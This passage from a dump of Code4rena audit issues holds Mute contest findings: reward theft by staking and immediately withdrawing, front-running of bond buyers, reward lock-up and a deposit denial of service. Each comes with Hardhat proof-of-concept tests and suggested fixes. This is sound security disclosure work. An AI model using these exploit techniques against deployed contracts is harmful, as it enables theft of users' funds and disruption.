[here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/Wander-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/162", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-39"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/BRONZEDISC-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/147", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-06"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/btk-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/136", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-132"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/0xnev-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/130", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "edited-by-warden", "G-49"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/4lulz-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/121", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-135"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/0xSmartContract-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/112", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-136"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/LeoGold-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/103", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-137"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/scokaf-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/88", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-139"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/climber2002-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/83", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "edited-by-warden", "G-50"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/RaymondFam-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/82", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "edited-by-warden", "G-51"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/pavankv-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/81", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-130"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/RaymondFam-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/80", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-140"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/ch0bu-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/79", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-52"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/ch0bu-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/70", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-133"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/chaduke-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/68", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-141"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/Englave-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/62", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "edited-by-warden", "G-53"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/chaduke-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/52", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "edited-by-warden", "G-54"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/Sathish9098-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/50", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-143"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/SunSec-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/46", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-144"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/georgits-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/41", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "edited-by-warden", "G-55"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/georgits-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/7", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-146"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/alejandrocovrr-Q.md)."}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1", "labels": ["sponsor confirmed"], "target": "2023-03-asymmetry-findings", "body": "# Agreements  **If you are a C4 Certified Contributor** by commenting or interacting with this repo prior to public release of the contest report, you agree that you have [read the Certified Warden docs](https://www.notion.so/code4rena/What-certified-wardens-can-should-do-06d1073540994cc08937f721c2951b0f) and agree to be bound by:  - [C4 Certified Contributor Terms and Conditions](https://github.com/code-423n4/code423n4.com/blob/main/_data/pages/certified-contributor-terms-and-conditions.md), - [C4 Code of Professional Conduct](https://www.notion.so/Code-of-Professional-Conduct-657c7d80d34045f19eee510ae06fef55), and - the disclosure guidelines below.  To signal your agreement to these terms, add a \ud83d\udc4d emoji to this issue.      Code4rena staff reserves the right to disqualify anyone from this role and similar future opportunities who is unable to participate within the above guidelines.  # Disclosures  Sponsors may elect to add team members and contractors to assist in sponsor review and triage. All sponsor representatives added to the repo should comment on this issue to identify themselves.  To ensure contest integrity, the following *potential* conflicts of interest should also be disclosed with a comment in this issue:   1. any sponsor staff or sponsor contractors who are also participating as wardens 2. any wardens hired to assist with sponsor review (and thus presenting sponsor viewpoint on findings) 3. any wardens who have a relationship with a judge that would typically fall in the category of potential conflict of interest (family, employer, business partner, etc) 4. any other case where someone might reasonably infer a possible conflict of interest."}, {"title": "Award is still distributed when there aren't any stakers, allowing users to get reward without staking", "html_url": "https://github.com/code-423n4/2023-03-mute-findings/issues/41", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-03-mute-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-mute/blob/main/contracts/amplifier/MuteAmplifier.sol#L95-L118   # Vulnerability details  ## Proof of Concept Consider the update modifier for the amplifier. ``` modifier update() {         if (_mostRecentValueCalcTime == 0) {             _mostRecentValueCalcTime = firstStakeTime;         }          uint256 totalCurrentStake = totalStake();          if (totalCurrentStake > 0 && _mostRecentValueCalcTime < endTime) {             uint256 value = 0;             uint256 sinceLastCalc = block.timestamp.sub(_mostRecentValueCalcTime);             uint256 perSecondReward = totalRewards.div(endTime.sub(firstStakeTime));              if (block.timestamp < endTime) {                 value = sinceLastCalc.mul(perSecondReward);             } else {                 uint256 sinceEndTime = block.timestamp.sub(endTime);                 value = (sinceLastCalc.sub(sinceEndTime)).mul(perSecondReward);             }              _totalWeight = _totalWeight.add(value.mul(10**18).div(totalCurrentStake));              _mostRecentValueCalcTime = block.timestamp;              (uint fee0, uint fee1) = IMuteSwitchPairDynamic(lpToken).claimFees();              _totalWeightFee0 = _totalWeightFee0.add(fee0.mul(10**18).div(totalCurrentStake));             _totalWeightFee1 = _totalWeightFee1.add(fee1.mul(10**18).div(totalCurrentStake));              totalFees0 = totalFees0.add(fee0);             totalFees1 = totalFees1.add(fee1);         }          _;     } ```  Suppose there's been a period with totalCurrentStake = 0, and a user stakes and immediately withdraws in the same transaction. When the user stakes, update doesn't do anything (including updating _mostRecentValueCalcTime) since totalCurrentStake = 0, and _userWeighted[account] gets set to _totalWeight (which hasn't been updated) in the stake function. https://github.com/code-423n4/2023-03-mute/blob/main/contracts/amplifier/MuteAmplifier.sol#L349 ``` function _stake(uint256 lpTokenIn, address account) private {         ...         _userWeighted[account] = _totalWeight;         ...     } ``` When the user withdraws, totalCurrentStake is no longer zero. Since _mostRecentValueCalcTime wasn't updated when the user staked (since totalCurrentStake was 0), the reward from the period with no stakers gets added to _totalWeight.  `uint256 sinceLastCalc = block.timestamp.sub(_mostRecentValueCalcTime);` `value = sinceLastCalc.mul(perSecondReward);` `_totalWeight = _totalWeight.add(value.mul(10**18).div(totalCurrentStake));` (These are lines in the update modifier)  As a result, this user who staked and immediately withdrew, got all the reward from the period with no stakers. See the reward calculation: https://github.com/code-423n4/2023-03-mute/blob/main/contracts/amplifier/MuteAmplifier.sol#L371 ``` function _applyReward(address account) private returns (uint256 lpTokenOut, uint256 reward, uint256 remainder, uint256 fee0, uint256 fee1) {         ...         reward = lpTokenOut.mul(_totalWeight.sub(_userWeighted[account])).div(calculateMultiplier(account, true));         ...     } ```  Observe that the exploit condition is met as soon as the staking period starts (as long as nobody stakes immediately). The code attempts to prevent this situation setting _mostRecentValueCalcTime to firstStakeTime the first time that update is invoked (which must be a stake call). https://github.com/code-423n4/2023-03-mute/blob/main/contracts/amplifier/MuteAmplifier.sol#L89-L91 ``` if (_mostRecentValueCalcTime == 0) {             _mostRecentValueCalcTime = firstStakeTime;         } ```           However, this doesn't do anything since the user can first set the firstStakeTime by staking as soon as the staking period starts, and then make totalCurrentStake 0 by immediately withdrawing. In fact, observe that this takes away from other staker's rewards since perSecondReward is now lower. https://github.com/code-423n4/2023-03-mute/blob/main/contracts/amplifier/MuteAmplifier.sol#L98 `uint256 perSecondReward = totalRewards.div(endTime.sub(firstStakeTime));`  Please add the following test to the \"advance to start time\" context in amplifier.ts (add it [here](https://github.com/code-423n4/2023-03-mute/blob/main/test/amplifier.ts#L157)), and run with `npm run test-amplifier`. ``` it(\"get reward without staking\", async function () {         await this.lpToken.transfer(this.staker1.address, staker1Initial.toFixed(), {from: this.owner.address});         await this.lpToken.connect(this.staker1).approve(           this.amplifier.address,           staker1Initial.toFixed()         );                  console.log(\"dmute balance before: \" + await this.dMuteToken.balanceOf(this.staker1.address))         await this.amplifier.connect(this.staker1).stake(1);         await this.amplifier.connect(this.staker1).withdraw();         await time.increaseTo(staking_end-10);         await this.amplifier.connect(this.staker1).stake(1);         await this.amplifier.connect(this.staker1).withdraw();         console.log(\"dmute balance after: \" + await this.dMuteToken.balanceOf(this.staker1.address))       });        it(\"get reward with staking\", async function () {         await this.lpToken.transfer(this.staker1.address, staker1Initial.toFixed(), {from: this.owner.address});         await this.lpToken.connect(this.staker1).approve(           this.amplifier.address,           staker1Initial.toFixed()         );         console.log(\"dmute balance before: \" + await this.dMuteToken.balanceOf(this.staker1.address))         await this.amplifier.connect(this.staker1).stake(1);         //await this.amplifier.connect(this.staker1).withdraw();         await time.increaseTo(staking_end-10);         //await this.amplifier.connect(this.staker1).stake(1);         await this.amplifier.connect(this.staker1).withdraw();         console.log(\"dmute balance after: \" + await this.dMuteToken.balanceOf(this.staker1.address))       }); ``` Result on my side: ``` advance to start time         \u2713 reverts without tokens approved for staking dmute balance before: 0 dmute balance after: 576922930658129099273         \u2713 get reward without staking dmute balance before: 0 dmute balance after: 576922912276064160247         \u2713 get reward with staking ```  This POC is a bit on the extreme side to get the point across. In the first test, the user stakes and then immediately unstakes, while in the second test, the user stakes for the entire period. In the end, the user gets roughly the same amount of reward.   ## Impact After periods with no stakers, users can get reward without staking. This is also possible at the beginning of the staking period, and doing so then will reduce the reward for other users in the process.   ## Tools Used Manual review, Hardhat  ## Recommended Mitigation Steps Possible solution 1: set a minimum duration that a user must stake for (prevent them from staking and immediately withdrawing) Possible solution 2: always update _mostRecentValueCalcTime (regardless totalCurrentStake). i.e. move the following line out of the if statement. https://github.com/code-423n4/2023-03-mute/blob/main/contracts/amplifier/MuteAmplifier.sol#L109  Keep in mind that with solution 2, no one gets the rewards in periods with no stakers - this means that the rescueTokens function needs to be updated to get retrieve these rewards. "}, {"title": "`MuteAmplifier.rescueTokens()` checks the wrong condition for `muteToken`", "html_url": "https://github.com/code-423n4/2023-03-mute-findings/issues/32", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-03-mute-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/amplifier/MuteAmplifier.sol#L185-L191   # Vulnerability details  ## Impact There will be 2 impacts.  - The reward system would be broken as the rewards can be withdrawn before starting staking. - Some rewards would be locked inside the contract forever as it doesn't check `totalReclaimed`  ## Proof of Concept `rescueTokens()` checks the below condition to rescue `muteToken`.  ```solidity else if (tokenToRescue == muteToken) {     if (totalStakers > 0) {         require(amount <= IERC20(muteToken).balanceOf(address(this)).sub(totalRewards.sub(totalClaimedRewards)),             \"MuteAmplifier::rescueTokens: that muteToken belongs to stakers\"         );     } } ```  But there are 2 problems. 1. Currently, it doesn't check anything when `totalStakers == 0`. So some parts(or 100%) of rewards can be withdrawn before the staking period. In this case, the reward system won't work properly due to the lack of rewards. 2. It checks the wrong condition when `totalStakers > 0` as well. As we can see [here](https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/amplifier/MuteAmplifier.sol#L241), some remaining rewards are tracked using `totalReclaimed` and transferred to treasury directly. So we should consider this amount as well.  ## Tools Used Manual Review  ## Recommended Mitigation Steps It should be modified like the below.  ```solidity else if (tokenToRescue == muteToken) {     if (totalStakers > 0) { //should check totalReclaimed as well         require(amount <= IERC20(muteToken).balanceOf(address(this)).sub(totalRewards.sub(totalClaimedRewards).sub(totalReclaimed)),             \"MuteAmplifier::rescueTokens: that muteToken belongs to stakers\"         );     }     else if(block.timestamp <= endTime) { //no stakers but staking is still active, should maintain totalRewards         require(amount <= IERC20(muteToken).balanceOf(address(this)).sub(totalRewards),             \"MuteAmplifier::rescueTokens: that muteToken belongs to stakers\"         );     } } ```"}, {"title": "Bond max-buyer might end up buying the max buy of the next epoch", "html_url": "https://github.com/code-423n4/2023-03-mute-findings/issues/25", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-03-mute-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/bonds/MuteBond.sol#L156-L158   # Vulnerability details  The `MuteBond.deposit()` function allows users to specify the amount of value they want to purchase bonds for or to set `max_buy` to true. If `max_buy` is set to true the amount specified in the `value` parameter is ignored and instead the maximum amount available for purchase in the current epoch is used.  This can lead to a scenario where a user intends to purchase the remaining amount of current epoch, but till the tx is included in the blockchain a new epoch starts (either by an innocent user or by an attacker) and the user ends up buying the entire amount of the next epoch.  ## Impact A. The user ends up buying a much higher amount than intended B. The user ends up buying it for a lower price than intended (i.e. less payout for the buyer)  ## Proof of Concept The PoC below shows how `maxPurchaseAmount()` increases when a new era starts.   File: `test/bonds.ts` ```solidity   it('Max buy PoC', async function () {      // buy 99% of amount available for purchase in current epoch     let maxValue = await bondContract.maxPurchaseAmount();     let depositValue = maxValue.mul(99).div(100);     await bondContract.connect(buyer1).deposit(depositValue, buyer1.address, false);          // The amount available when the victim sends out the tx     var expectedDeposit = await bondContract.maxPurchaseAmount()      await bondContract.connect(buyer1).deposit('0', buyer1.address, true);      // The amount available when the victims's tx is included in the blockchain     var actualDeposit = await bondContract.maxPurchaseAmount();          // expected deposit = 1 wad     // actual deposit = 100 wad     console.log({expectedDeposit, actualDeposit});   }) ```  [The following snippet](https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/bonds/MuteBond.sol#L156-L159) shows that when a user sets `max_buy` to true the value used is the `maxPurchaseAmount()` ```solidity         if(max_buy == true){           value = maxPurchaseAmount();           payout = maxDeposit();         } else { ```    ## Recommended Mitigation Steps Require the user to specify the epoch number when doing a 'max buy', and revert if it doesn't match the current epoch (it might be a good idea to refactor the code to 2 external functions for normal buy and max buy, where they both share an internal function to make the actual deposit)   Side note: this is similar to another bug I've reported regarding getting a lower price than expected, however the root cause, impact, and mitigation are different and therefore I've reported this separately."}, {"title": "Attacker can front-run Bond buyer and make them buy it for a lower payout than expected", "html_url": "https://github.com/code-423n4/2023-03-mute-findings/issues/24", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-02"], "target": "2023-03-mute-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/bonds/MuteBond.sol#L185-L187   # Vulnerability details  The `MuteBond` contract contains a feature in which after each purchase the `epochStart` increases by 5% of the time passed since `epochStart`, this (in most cases) lowers the bond's price (i.e. buyer gets less payout) for future purchases. An attacker can exploit this feature to front-run a deposit/purchase tx and lower the victim's payout. This can also happen by innocent users purchasing before the victim's tx is included in the blockchain.  Another (less likely) scenario in which this can happen is when the owner changes the config in a way that lowers the price (e.g. lowering max price, extending epoch duration), if the owner tx executes while a user's `deposit()` tx is in the mempool the user would end up with less payout than intended.  Side note: the term 'bond price' might be confusing since it refers to the payout the buyer gets divided by the value the buyer pays, so a higher price is actually in favor of the buyer.  ## Impact User ends up buying bond for a lower payout than intended.  ## Proof of Concept In the PoC below, an attacker manages to make the buyer purchase a bond at a price lower by 32% than intended.  File: `test/bonds.ts` ```typescript   it('Front run PoC', async function () {     // let price reach the max price     await time.increase(60 * 60 * 24 * 7)      // price when victim sends out the tx to the mempool     var expectedPrice = await bondContract.bondPrice()      const startPrice = new BigNumber(100).times(Math.pow(10,18))     let minPurchasePayout = new BigNumber(Math.pow(10,16));     // using dynamic price didn't work out so I'm using the lowest price     var minPurchaseValue = minPurchasePayout.times(1e18).div(startPrice).plus(1);      // attacker buys the lowest amount 20 times     for(let i = 0; i< 20; i++){       await bondContract.connect(buyer1).deposit(minPurchaseValue.toFixed(), buyer1.address, false)     }      var init_dmute = await dMuteToken.GetUnderlyingTokens(buyer1.address)     let depositValue = new BigNumber(10).times(Math.pow(10,18)).toFixed();     var price = await bondContract.connect(buyer1).deposit(depositValue, buyer1.address, false)     var post_dmute = await dMuteToken.GetUnderlyingTokens(buyer1.address)      var dmute_diff = new BigNumber(post_dmute.toString()).minus(init_dmute.toString());     var actualPrice = dmute_diff.times(1e18).div(depositValue);      var receipt = (await price.wait())     // compare the expected price with the actual price     // expected price = 200; actual price = 135.8; meaning actual price is ~68% of expected price     console.log({expectedPrice, actualPrice:actualPrice.toString()});   }) ```  ## Recommended Mitigation Steps Add a min payout parameter so that users can specify the expected payout. The tx should revert if the actual payout is lower than expected."}, {"title": "An edge case in amplifier allows user to stake after end time, causing reward to be locked in the contract", "html_url": "https://github.com/code-423n4/2023-03-mute-findings/issues/23", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-03-mute-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-mute/blob/main/contracts/amplifier/MuteAmplifier.sol#L208-L212   # Vulnerability details  ## Proof of Concept Observe that if nobody has staked after the period has ended, it's still possible for a single user to stake even though the period has ended. https://github.com/code-423n4/2023-03-mute/blob/main/contracts/amplifier/MuteAmplifier.sol#L208-L212 ```         if (firstStakeTime == 0) {             firstStakeTime = block.timestamp;         } else {             require(block.timestamp < endTime, \"MuteAmplifier::stake: staking is over\");         } ```  The staker can't get any of the rewards because the update modifier won't drip the rewards (since _mostRecentValueCalcTime = firstStakeTime >= endTime). https://github.com/code-423n4/2023-03-mute/blob/main/contracts/amplifier/MuteAmplifier.sol#L89-L95 ```         if (_mostRecentValueCalcTime == 0) {             _mostRecentValueCalcTime = firstStakeTime;         }          uint256 totalCurrentStake = totalStake();          if (totalCurrentStake > 0 && _mostRecentValueCalcTime < endTime) {             ...         } ```  At the same time, the protocol can't withdraw the rewards with rescueToken either since there is a staker, and no reward has been claimed yet (so the following check fails). https://github.com/code-423n4/2023-03-mute/blob/main/contracts/amplifier/MuteAmplifier.sol#L187 ```         else if (tokenToRescue == muteToken) {             if (totalStakers > 0) {                 require(amount <= IERC20(muteToken).balanceOf(address(this)).sub(totalRewards.sub(totalClaimedRewards)),                     \"MuteAmplifier::rescueTokens: that muteToken belongs to stakers\"                 );             }         } ```  ## Impact Suppose the staking period ends and nobody has staked. The admin would like to withdraw the rewards. A malicious user can front-run the rescueTokens call with a call to stake to lock all the rewards inside the contract indefinitely.  ## Tools Used Manual Review  ## Recommended Mitigation Steps https://github.com/code-423n4/2023-03-mute/blob/main/contracts/amplifier/MuteAmplifier.sol#L208-L212 The require shouldn't be inside the else block."}, {"title": "MuteBond is susceptible to DOS", "html_url": "https://github.com/code-423n4/2023-03-mute-findings/issues/22", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-05"], "target": "2023-03-mute-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-mute/blob/main/contracts/bonds/MuteBond.sol#L179 https://github.com/code-423n4/2023-03-mute/blob/main/contracts/dao/dMute.sol#L75-L77 https://github.com/code-423n4/2023-03-mute/blob/main/contracts/dao/dMute.sol#L57   # Vulnerability details  ## Proof of Concept Observe that if timeToTokens is called with _lock_time = 1 week, _amount < 52, it will return 0. https://github.com/code-423n4/2023-03-mute/blob/main/contracts/dao/dMute.sol#L57 ``` function timeToTokens(uint256 _amount, uint256 _lock_time) internal pure returns (uint256){         uint256 week_time = 1 weeks;         uint256 max_lock = 52 weeks;          require(_lock_time >= week_time, \"dMute::Lock: INSUFFICIENT_TIME_PARAM\");         require(_lock_time <= max_lock, \"dMute::Lock: INSUFFICIENT_TIME_PARAM\");          // amount * % of time locked up from min to max         uint256 base_tokens = _amount.mul(_lock_time.mul(10**18).div(max_lock)).div(10**18);         // apply % min max bonus         //uint256 boosted_tokens = base_tokens.mul(lockBonus(lock_time)).div(10**18);          return base_tokens;     } ```  This causes lockTo to revert. https://github.com/code-423n4/2023-03-mute/blob/main/contracts/dao/dMute.sol#L75-L77 ```  function LockTo(uint256 _amount, uint256 _lock_time, address to) public nonReentrant {         require(IERC20(MuteToken).balanceOf(msg.sender) >= _amount, \"dMute::Lock: INSUFFICIENT_BALANCE\");          //transfer tokens to this contract         IERC20(MuteToken).transferFrom(msg.sender, address(this), _amount);          // calculate dTokens to mint         uint256 tokens_to_mint = timeToTokens(_amount, _lock_time);          require(tokens_to_mint > 0, 'dMute::Lock: INSUFFICIENT_TOKENS_MINTED');          _mint(to, tokens_to_mint);          _userLocks[to].push(UserLockInfo(_amount, block.timestamp.add(_lock_time), tokens_to_mint));          emit LockEvent(to, _amount, tokens_to_mint, _lock_time);     } ```  The deposit function of muteBond calls lockTo with _amount = payout. https://github.com/code-423n4/2023-03-mute/blob/main/contracts/bonds/MuteBond.sol#L179 `IDMute(dMuteToken).LockTo(payout, bond_time_lock, _depositor);`  Observe that regardless what the inputs are, `payout <= maxDeposit()` is always satisfied after the following code segment. https://github.com/code-423n4/2023-03-mute/blob/main/contracts/bonds/MuteBond.sol#L155-L164 ```         uint payout = payoutFor( value );         if(max_buy == true){           value = maxPurchaseAmount();           payout = maxDeposit();         } else {           // safety checks for custom purchase           require( payout >= ((10**18) / 100), \"Bond too small\" ); // must be > 0.01 payout token ( underflow protection )           require( payout <= maxPayout, \"Bond too large\"); // size protection because there is no slippage           require( payout <= maxDeposit(), \"Deposit too large\"); // size protection because there is no slippage         } ```  So, if an attacker manipulates the muteBond to get maxDeposit() < 52, deposit will always fail. Please add the following test case to bonds.ts and run it with `npm run test-bond` Note that if the bond price is too high (> 52e18), then this won't always be possible ([because payout will change by bondPrice every time we increment/decrement value](https://github.com/code-423n4/2023-03-mute/blob/main/contracts/bonds/MuteBond.sol#L242)). So in my POC, I set the price range to be (1e18 - 2e18), which I believe are reasonable values as well.  ``` it('Bond DOS', async function () {      await bondContract.setStartPrice(new BigNumber(1).times(Math.pow(10,18)).toFixed())     await bondContract.setMaxPrice(new BigNumber(2).times(Math.pow(10,18)).toFixed())     await bondContract.setMaxPayout(new BigNumber(100).times(Math.pow(10,18)).toFixed())          // ideally, the following line is what I had in mind     // var val = new BigNumber((await bondContract.maxPurchaseAmount()).toString()).minus(1).toFixed()     // but due to timing issues I couldn't get it to work (I'm not very familiar with hardhat)      // so I just ran this to get the value for the next line     // await time.increase(1)     // console.log(await bondContract.maxPurchaseAmount());       var val = new BigNumber(\"99998511926905849653\").toFixed();          console.log(\"before:\")     console.log(await bondContract.maxDeposit())     /*     console.log(await bondContract.payoutFor(val))     console.log(await bondContract.maxPayout())     console.log((await bondContract.maxPurchaseAmount()))     */          await bondContract.connect(buyer1).deposit(val, buyer1.address, false)      console.log(\"after:\")     console.log(await bondContract.maxDeposit())     /*     console.log(await bondContract.payoutFor(val))     console.log(await bondContract.maxPayout())     console.log((await bondContract.maxPurchaseAmount()))     */      await expect(       bondContract.connect(buyer1).deposit(1, buyer1.address, false)     ).to.be.reverted;               await expect(       bondContract.connect(buyer1).deposit(1, buyer1.address, true)     ).to.be.reverted;           await expect(       bondContract.connect(buyer1).deposit(new BigNumber(1).times(Math.pow(10,18)).toFixed(), buyer1.address, false)     ).to.be.reverted;      await expect(       bondContract.connect(buyer1).deposit(new BigNumber(1).times(Math.pow(10,18)).toFixed(), buyer1.address, true)     ).to.be.reverted;   }) ```   ## Impact This vulnerability causes deposit to fail indefinitely. That being said, the contract itself doesn't seem to store funds, and it looks like there are ways for the admin to manually fix the DOS (e.g. deploy a new contract, set startPrice / maxPrice). So overall, I would say it warrants a medium severity.  ## Tools Used Manual Review, Hardhat  ## Recommended Mitigation Steps Start a new epoch if maxDeposit() is smaller than a certain threshold."}, {"title": "Amplifier users might not get all the LP fees they are entitled to", "html_url": "https://github.com/code-423n4/2023-03-mute-findings/issues/21", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-03-mute-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-mute/blob/main/contracts/amplifier/MuteAmplifier.sol#L111   # Vulnerability details  ## Proof of Concept Observe that there is only one place that the amplifier is calling claimFees, and it's inside an if statement of the update modifier, requiring `_mostRecentValueCalcTime < endTime`.  https://github.com/code-423n4/2023-03-mute/blob/main/contracts/amplifier/MuteAmplifier.sol#L111 ``` modifier update() {         if (_mostRecentValueCalcTime == 0) {             _mostRecentValueCalcTime = firstStakeTime;         }          uint256 totalCurrentStake = totalStake();          if (totalCurrentStake > 0 && _mostRecentValueCalcTime < endTime) {             uint256 value = 0;             uint256 sinceLastCalc = 